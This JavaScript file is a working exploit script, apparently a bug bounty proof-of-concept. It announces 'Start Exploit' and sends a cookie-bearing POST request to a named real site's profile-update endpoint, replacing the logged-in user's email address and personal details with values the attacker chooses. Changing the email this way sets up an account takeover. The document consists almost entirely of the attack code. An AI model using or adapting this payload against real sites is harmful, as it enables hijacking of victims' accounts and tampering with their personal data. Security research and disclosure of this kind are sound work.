alert("Start Exploit");
(async () => {
  const url = "https://y-3.com/mypage/user_info_complete.html";

  const body = new URLSearchParams({
    member_mail: "thebee0x+1@wearehackerone.com",
    member_mail2: "thebee0x+1@wearehackerone.com",
    member_bef_mail: "thebee0x+1@wearehackerone.com",
    member_first_name: "bb",
    member_family_name: "ccc",
    member_first_name_kana: "スミス",
    member_family_name_kana: "ジョン",
    member_gender: "1",
    member_birth_year: "2003",
    member_birth_month: "12",
    member_birth_day: "22",
    member_zipcode: "1000001",
    member_pref_code: "13",
    member_pref_name: "東京都",
    member_address: "千代田区千代田",
    member_add_no: "as",
    member_building_name: "2",
    member_phone1: "233",
    member_phone2: "2333",
    member_phone3: "2333",
  });

  try {
    const response = await fetch(url, {
      method: "POST",
      credentials: "include", // Include cookies in the request
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: body.toString(),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    const responseText = await response.text();
    console.log(responseText); // Output the response for debugging
  } catch (error) {
    console.error("Error sending request:", error);
  }
})();
